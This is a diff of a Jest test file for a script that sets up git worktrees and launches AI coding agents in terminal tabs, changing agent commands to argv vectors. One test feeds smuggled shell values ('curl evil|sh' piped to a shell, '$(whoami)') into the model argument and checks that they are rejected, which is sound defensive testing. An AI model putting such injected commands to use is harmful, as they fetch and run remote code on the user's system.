@@ -1,18 +1,18 @@
-const { parseArgs, makeAgent } = require('../skills/herdr/scripts/up.js');
+const { parseArgs, makeAgent, launchAgent, up } = require('../skills/herdr/scripts/up.js');
 
 describe('makeAgent', () => {
-  test('claude → ◆ glyph, "claude" argv', () => {
+  test('claude → ◆ glyph, ["claude"] argv', () => {
     expect(makeAgent('claude', 'sly'))
-      .toEqual({ model: 'claude', handle: 'sly', runArgv: 'claude', glyph: '◆' });
+      .toEqual({ model: 'claude', handle: 'sly', runArgv: ['claude'], glyph: '◆' });
   });
-  test('codex → ◇ glyph, "codex" argv', () => {
+  test('codex → ◇ glyph, ["codex"] argv', () => {
     expect(makeAgent('codex', 'jay'))
-      .toEqual({ model: 'codex', handle: 'jay', runArgv: 'codex', glyph: '◇' });
+      .toEqual({ model: 'codex', handle: 'jay', runArgv: ['codex'], glyph: '◇' });
   });
-  test('opencode splits handle:model into "opencode -m <model>" (model may contain colons)', () => {
+  test('opencode splits handle:model into an argv vector (model may contain colons)', () => {
     expect(makeAgent('opencode', 'bob:ollama/qwen2.5:7b')).toEqual({
       model: 'opencode', handle: 'bob',
-      runArgv: 'opencode -m ollama/qwen2.5:7b', glyph: '⬨',
+      runArgv: ['opencode', '-m', 'ollama/qwen2.5:7b'], glyph: '⬨',
     });
   });
   test('opencode without :model throws', () => {
@@ -22,7 +22,7 @@ describe('makeAgent', () => {
     expect(() => makeAgent('opencode', 'bob:x; curl evil|sh')).toThrow(/unsafe characters/);
     expect(() => makeAgent('opencode', 'bob:$(whoami)')).toThrow(/unsafe characters/);
     // a legitimate model with dots, slashes and a colon is still accepted
-    expect(makeAgent('opencode', 'bob:ollama/qwen2.5:7b').runArgv).toBe('opencode -m ollama/qwen2.5:7b');
+    expect(makeAgent('opencode', 'bob:ollama/qwen2.5:7b').runArgv).toEqual(['opencode', '-m', 'ollama/qwen2.5:7b']);
   });
 });
 
@@ -57,8 +57,7 @@ describe('parseArgs', () => {
   });
 });
 
-const { up } = require('../skills/herdr/scripts/up.js');
-
+// Responses may be strings or (file, args) => string functions.
 function fakeRunner(matchers) {
   const calls = [];
   const run = (file, args) => {
@@ -66,10 +65,10 @@ function fakeRunner(matchers) {
     for (const [pred, resp] of matchers) {
       if (pred(file, args)) {
         if (resp instanceof Error) throw resp;
-        return resp;
+        return typeof resp === 'function' ? resp(file, args) : resp;
       }
     }
-    return ''; // fetch / tab rename / pane run / wait / agent rename print nothing
+    return '';
   };
   return { run, calls };
 }
@@ -83,71 +82,101 @@ const WT = JSON.stringify({
     tab: { tab_id: 'wR:t1' },
   },
 });
-const TAB2 = JSON.stringify({
-  result: { tab: { tab_id: 'wR:t2' }, root_pane: { pane_id: 'wR:p2' } },
-});
 
-const matchers = (listResp = AGENT_LIST()) => [
-  [(f, a) => f === 'herdr' && a[0] === 'agent' && a[1] === 'list', listResp],
-  [(f, a) => f === 'herdr' && a[0] === 'worktree' && a[1] === 'create', WT],
-  [(f, a) => f === 'herdr' && a[0] === 'tab' && a[1] === 'create', TAB2],
-];
+// Dynamic tab/pane ids so multi-agent sequences stay distinguishable:
+// tab create -> t2/p2, t3/p4, ...; agent start -> p3, p5, ...
+function dynMatchers(listResp = AGENT_LIST()) {
+  let t = 1;
+  let p = 1;
+  return [
+    [(f, a) => f === 'herdr' && a[0] === 'agent' && a[1] === 'list', listResp],
+    [(f, a) => f === 'herdr' && a[0] === 'worktree' && a[1] === 'create', WT],
+    [(f, a) => f === 'herdr' && a[0] === 'tab' && a[1] === 'create',
+      () => JSON.stringify({ result: { tab: { tab_id: `wR:t${++t}` }, root_pane: { pane_id: `wR:p${++p}` } } })],
+    [(f, a) => f === 'herdr' && a[0] === 'agent' && a[1] === 'start',
+      (f, a) => JSON.stringify({ result: { agent: { pane_id: `wR:p${++p}`, name: a[2] } } })],
+  ];
+}
+
+describe('launchAgent', () => {
+  test('tab create -> agent start --tab (named at start) -> close root -> wait idle', () => {
+    const { run, calls } = fakeRunner(dynMatchers());
+    const out = launchAgent(makeAgent('codex', 'jay'), { workspace: 'wR', cwd: '/wt/x' }, { run });
+    expect(out).toEqual({ handle: 'jay', model: 'codex', pane_id: 'wR:p3', tab: 'wR:t2' });
+    expect(calls).toEqual([
+      ['herdr', 'tab', 'create', '--workspace', 'wR', '--cwd', '/wt/x', '--label', 'jay ◇', '--no-focus'],
+      ['herdr', 'agent', 'start', 'jay', '--tab', 'wR:t2', '--cwd', '/wt/x', '--no-focus', '--', 'codex'],
+      ['herdr', 'pane', 'close', 'wR:p2'],
+      ['herdr', 'agent', 'wait', 'jay', '--status', 'idle', '--timeout', '45000'],
+    ]);
+  });
+  test('label and timeout are overridable', () => {
+    const { run, calls } = fakeRunner(dynMatchers());
+    launchAgent(makeAgent('claude', 'sly'), { workspace: 'wR', cwd: '/wt/x', label: 'x', timeout: 9000 }, { run });
+    expect(calls).toContainEqual(
+      ['herdr', 'tab', 'create', '--workspace', 'wR', '--cwd', '/wt/x', '--label', 'x', '--no-focus']);
+    expect(calls).toContainEqual(['herdr', 'agent', 'wait', 'sly', '--status', 'idle', '--timeout', '9000']);
+  });
+});
 
 describe('up', () => {
   test('single claude agent: exact call sequence and result', () => {
-    const { run, calls } = fakeRunner(matchers());
+    const { run, calls } = fakeRunner(dynMatchers());
     const result = up(['--branch', 'chore/x', '--claude', 'sly'], { run });
 
     expect(result).toEqual({
       worktree: { path: '/wt/x', workspace_id: 'wR' },
-      agents: [{ handle: 'sly', model: 'claude', pane_id: 'wR:p1', tab: 'wR:t1' }],
+      agents: [{ handle: 'sly', model: 'claude', pane_id: 'wR:p3', tab: 'wR:t2' }],
     });
     expect(calls).toEqual([
       ['herdr', 'agent', 'list'],
       ['git', 'fetch', 'origin', 'main'],
       ['herdr', 'worktree', 'create', '--branch', 'chore/x', '--base', 'origin/main', '--no-focus', '--json'],
-      ['herdr', 'tab', 'rename', 'wR:t1', 'sly ◆'],
-      ['herdr', 'pane', 'run', 'wR:p1', 'claude'],
-      ['herdr', 'wait', 'agent-status', 'wR:p1', '--status', 'idle', '--timeout', '45000'],
-      ['herdr', 'agent', 'rename', 'wR:p1', 'sly'],
+      ['herdr', 'tab', 'create', '--workspace', 'wR', '--cwd', '/wt/x', '--label', 'sly ◆', '--no-focus'],
+      ['herdr', 'agent', 'start', 'sly', '--tab', 'wR:t2', '--cwd', '/wt/x', '--no-focus', '--', 'claude'],
+      ['herdr', 'pane', 'close', 'wR:p2'],
+      ['herdr', 'agent', 'wait', 'sly', '--status', 'idle', '--timeout', '45000'],
+      ['herdr', 'tab', 'close', 'wR:t1'], // the worktree's original root tab
     ]);
   });
 
-  test('second agent gets a new tab and is renamed on its own pane', () => {
-    const { run, calls } = fakeRunner(matchers());
+  test('each agent gets its own tab; the worktree root tab closes last', () => {
+    const { run, calls } = fakeRunner(dynMatchers());
     const result = up(['--branch', 'chore/x', '--claude', 'sly', '--codex', 'jay'], { run });
 
     expect(result.agents).toEqual([
-      { handle: 'sly', model: 'claude', pane_id: 'wR:p1', tab: 'wR:t1' },
-      { handle: 'jay', model: 'codex', pane_id: 'wR:p2', tab: 'wR:t2' },
+      { handle: 'sly', model: 'claude', pane_id: 'wR:p3', tab: 'wR:t2' },
+      { handle: 'jay', model: 'codex', pane_id: 'wR:p5', tab: 'wR:t3' },
     ]);
     expect(calls).toContainEqual(
       ['herdr', 'tab', 'create', '--workspace', 'wR', '--cwd', '/wt/x', '--label', 'jay ◇', '--no-focus']);
-    expect(calls).toContainEqual(['herdr', 'pane', 'run', 'wR:p2', 'codex']);
-    expect(calls).toContainEqual(['herdr', 'agent', 'rename', 'wR:p2', 'jay']);
+    expect(calls).toContainEqual(
+      ['herdr', 'agent', 'start', 'jay', '--tab', 'wR:t3', '--cwd', '/wt/x', '--no-focus', '--', 'codex']);
+    expect(calls[calls.length - 1]).toEqual(['herdr', 'tab', 'close', 'wR:t1']);
   });
 
-  test('opencode agent runs "opencode -m <model>"', () => {
-    const { run, calls } = fakeRunner(matchers());
+  test('opencode agent starts with the argv vector', () => {
+    const { run, calls } = fakeRunner(dynMatchers());
     up(['--branch', 'b', '--opencode', 'bob:ollama/qwen2.5:7b'], { run });
-    expect(calls).toContainEqual(['herdr', 'pane', 'run', 'wR:p1', 'opencode -m ollama/qwen2.5:7b']);
+    expect(calls).toContainEqual(
+      ['herdr', 'agent', 'start', 'bob', '--tab', 'wR:t2', '--cwd', '/wt/x', '--no-focus',
+        '--', 'opencode', '-m', 'ollama/qwen2.5:7b']);
   });
 
   test('git fetch derives the branch from --base', () => {
-    const { run, calls } = fakeRunner(matchers());
+    const { run, calls } = fakeRunner(dynMatchers());
     up(['--branch', 'b', '--base', 'origin/dev', '--claude', 'sly'], { run });
     expect(calls).toContainEqual(['git', 'fetch', 'origin', 'dev']);
   });
 
-  test('--timeout flows into the wait call', () => {
-    const { run, calls } = fakeRunner(matchers());
+  test('--timeout flows into the readiness wait', () => {
+    const { run, calls } = fakeRunner(dynMatchers());
     up(['--branch', 'b', '--timeout', '9000', '--claude', 'sly'], { run });
-    expect(calls).toContainEqual(
-      ['herdr', 'wait', 'agent-status', 'wR:p1', '--status', 'idle', '--timeout', '9000']);
+    expect(calls).toContainEqual(['herdr', 'agent', 'wait', 'sly', '--status', 'idle', '--timeout', '9000']);
   });
 
   test('pre-flight rejects a globally taken handle without creating a worktree', () => {
-    const { run, calls } = fakeRunner(matchers(AGENT_LIST(['sly'])));
+    const { run, calls } = fakeRunner(dynMatchers(AGENT_LIST(['sly'])));
     expect(() => up(['--branch', 'b', '--claude', 'sly'], { run })).toThrow(/already taken: sly/);
     expect(calls.some((c) => c[1] === 'worktree' && c[2] === 'create')).toBe(false);
   });
